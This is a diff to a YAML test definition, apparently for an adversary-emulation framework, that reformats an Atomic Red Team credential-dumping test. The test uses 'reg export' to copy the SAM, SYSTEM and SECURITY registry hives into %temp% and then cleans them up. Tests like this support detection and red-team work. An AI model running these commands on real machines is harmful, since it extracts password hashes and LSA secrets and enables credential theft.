@@ -1,20 +1,18 @@
-- id: bff366b2-23cc-5d6f-b182-8dc4c56a3c02
+- requirements: []
   name: Soumaia ART Tests - Dumping of SAM, creds, and secrets(Reg Export)
   description: 'Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
 
     Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory. (requires elevation)'
   tactic: credential-access
-  technique:
-    attack_id: T1003.002
-    name: 'OS Credential Dumping: Security Account Manager'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          reg export HKLM\sam %temp%\sam
-          reg export HKLM\system %temp%\system
-          reg export HKLM\security %temp%\security
-        cleanup: |-
-          del %temp%\sam >nul 2> nul
-          del %temp%\system >nul 2> nul
-          del %temp%\security >nul 2> nul
+  technique_id: T1003.002
+  technique_name: 'OS Credential Dumping: Security Account Manager'
+  executors:
+  - cleanup:
+    - del %temp%\sam >nul 2> nul & del %temp%\system >nul 2> nul & del %temp%\security >nul 2> nul
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: reg export HKLM\sam %temp%\sam & reg export HKLM\system %temp%\system & reg export HKLM\security %temp%\security
+  id: bff366b2-23cc-5d6f-b182-8dc4c56a3c02
